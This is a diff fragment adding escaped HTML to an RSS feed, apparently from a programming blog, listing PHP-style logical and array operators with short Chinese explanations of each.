+&lt;li&gt;&amp;amp;&amp;amp;   都为true则返回true&lt;/li&gt;
+&lt;li&gt;||   至少有一个为true则返回true&lt;/li&gt;
+&lt;li&gt;！    不为true则返回true
+```&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;数组运算符
+```&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;+   联合但不覆盖重复的键&lt;/li&gt;
+&lt;li&gt;==   拥有相同键/值对则返回true&lt;/li&gt;
+&lt;li&gt;===  拥有相同键/值对，且顺序相同、类型相同则返回true&lt;/li&gt;
+&lt;li&gt;！=   不等于则返回true&lt;/li&gt;
+&lt;li&gt;&amp;lt;&amp;gt;   不等于则返回true&lt;/li&gt;
+&lt;li&gt;!==  完全不同则返回true
+```&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
